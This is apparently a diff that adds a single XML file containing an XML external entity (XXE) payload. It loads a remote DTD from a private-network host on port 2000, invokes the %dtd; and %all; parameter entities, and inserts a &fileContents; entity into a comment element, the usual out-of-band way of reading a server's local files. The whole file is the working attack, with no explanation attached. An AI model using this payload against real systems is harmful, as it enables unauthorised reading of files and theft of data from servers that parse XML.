@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE copyright [
+  <!ENTITY % dtd SYSTEM
+  "http://192.168.122.1:2000/task.dtd">
+  %dtd;
+  %all;
+]>
+<comment><text>&fileContents;</text></comment>
